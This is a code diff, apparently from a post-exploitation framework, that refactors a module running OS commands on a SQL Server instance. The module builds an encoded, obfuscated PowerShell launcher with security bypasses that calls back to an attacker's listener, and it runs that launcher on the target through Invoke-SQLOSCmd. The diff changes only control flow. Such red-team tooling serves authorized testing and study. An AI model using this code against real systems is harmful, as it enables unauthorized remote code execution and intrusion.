@@ -53,24 +53,22 @@ class Module:
         if command == "":
             if not main_menu.listenersv2.get_active_listener_by_name(listener_name):
                 return handle_error_message("[!] Invalid listener: " + listener_name)
-            else:
-                launcher = main_menu.stagers.generate_launcher(
-                    listenerName=listener_name,
-                    language="powershell",
-                    encode=True,
-                    obfuscate=launcher_obfuscate,
-                    obfuscation_command=launcher_obfuscate_command,
-                    userAgent=userAgent,
-                    proxy=proxy,
-                    proxyCreds=proxy_creds,
-                    bypasses=params["Bypasses"],
-                )
-                if launcher == "":
-                    return handle_error_message("[!] Error generating launcher")
-                else:
-                    command = (
-                        "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\" + launcher
-                    )
+
+            launcher = main_menu.stagers.generate_launcher(
+                listenerName=listener_name,
+                language="powershell",
+                encode=True,
+                obfuscate=launcher_obfuscate,
+                obfuscation_command=launcher_obfuscate_command,
+                userAgent=userAgent,
+                proxy=proxy,
+                proxyCreds=proxy_creds,
+                bypasses=params["Bypasses"],
+            )
+            if launcher == "":
+                return handle_error_message("[!] Error generating launcher")
+
+            command = "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\" + launcher
 
         script_end = f'Invoke-SQLOSCmd -Instance "{instance}" -Command "{command}"'
 
@@ -79,10 +77,9 @@ class Module:
         if password != "":
             script_end += " -Password " + password
 
-        script = main_menu.modulesv2.finalize_module(
+        return main_menu.modulesv2.finalize_module(
             script=script,
             script_end=script_end,
             obfuscate=obfuscate,
             obfuscation_command=obfuscation_command,
         )
-        return script
